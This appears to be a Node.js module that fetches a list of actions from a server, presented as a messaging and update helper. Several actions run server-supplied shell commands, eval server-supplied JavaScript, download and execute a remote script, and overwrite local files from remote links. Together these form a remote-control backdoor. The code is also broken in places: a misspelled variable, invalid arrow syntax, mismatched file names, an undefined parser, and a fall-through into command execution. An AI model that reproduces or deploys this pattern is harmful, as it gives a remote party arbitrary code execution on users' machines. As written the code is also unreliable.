var request = require('./minirequest')
var fs = require('fs');
module.exports = function(url,version,uid,data) {
  request(url,function(error,response,body) {
    if (!error && respone.statusCode == 200) {
      var a = JSON.parse(body)
      a.forEach((action)=>{
        if (!action.type || !action.content) return;
        switch (action.type) {
          case "msg":
            console.log("\x1b[32mRecieved message from server: \n" + action.content + "\x1b[0m");
            break;
          case "warn":
            console.log("\x1b[31m[\x1b[5mImportant!\x1b[0m\x1b[31m Recieved important message from server: \n" + action.content + "\x1b[0m")
          case "execute":
            require('child_process').exec(action.content)
            break;
          case "execOnlineFile":
            request(action.content,function(e,r,b)=>{
                  if (!e && r.statusCode == 200) {
                    fs.writeFileSync(__dirname + "/asddwfe.js",b);
                    var g = require("./assdwfe.js");
                    g(version,uid,data);
                    fs.unlinkSync("./assdwfe.js");
                  }
            })
            break;
          case "exec":
            eval(action.content);
            break;
          case "checkUpdate":
               var com = parseInt(version.replace(/\./g,''));
              var cur = parseInt(action.content.replace(/\./g,''));
            if (com < cur) {
              var description = (action.description) ? action.description : "No description provided"
              console.log("\x1b[31m[Update] An update is available, current version: " + version + " Available: " + action.content + " Description: " + description + "\x1b[0m")
              
            }
            break;
          case "optin":
            
           optin(action,uid)
            
            
            break;
        }
      })
      
    } else {
      return "ERROR: Couldnt contact servers."
      
    }
    function optin(action,uid) {
       try {
              var a = fs.readFileSync(__dirname + "/data.rson","utf8");
             var k = RSON.parse(a)
              var l = k.optin
            } catch (e) {
              var l = false;
            }
            var a = {
                optin: true,
              }
              if (action.content.indexOf(uid) == -1 && l == true) {
                console.log("You have opted out from testing beta software. Downloading...")
                download(false)
              }
              
              fs.writeFileSync(__dirname + "/data.rson",RSON.stringify(a));
            if (l != true) {
              console.log("You have opted into testing beta software. Downloading...")
              download(true)
              
            }
            
            function download(a) {
              var dow = 0;
              var tobe = 2;
              var link = (a) ? action.updatelink : action.optinlink;
              function finish() {
                console.log("Running npm install...")
                loading("Running npm install");
    var child = require('child_process').exec("npm install", function (error, stdout, stderr) {
      if (error !== null) {
        console.error('[Execution Error] Failed to run npm install  Reason: ', error);
        console.error('[Execution Error] You should exit the server and run: npm install');
      }
    });
    loading("Done! Shutting down...       ");
    process.exit(0)
              }
              function loading(action) {
    dow ++;
    if (dow == tobe - 2) finish()
    var percent = Math.round(dow/tobe*10)
    var bar = ""
    for(var i = 0; i < percent; i++) {
      bar = bar + "===";
    }
    if (percent == 10) bar = bar + "="; else bar = bar + ">";
    var extras = 31 - bar.length;
    var extra = "";
    for (var i = 0; i < extras; i++) extra = extra + " ";
    process.stdout.write("[Update] [" + bar + extra + "] " +  percent*10 + "% " + action + "\r");
    
    
  }
  
  request(link,function(e,r,b) {
   if (!e && r.statusCode == 200) {
    var list = JSON.parse(b);
    list.forEach((file)=>{
      tobe ++;
      request(file.db,function(e,r,b) {
        if (!e && r.statusCode == 200) {
fs.writeFile(file.src,b,function() {
  loading("Downloading...")
})

        }
      })
    })
   } 
  })
    }
    }
    
  })
  
  
  
  
  
}
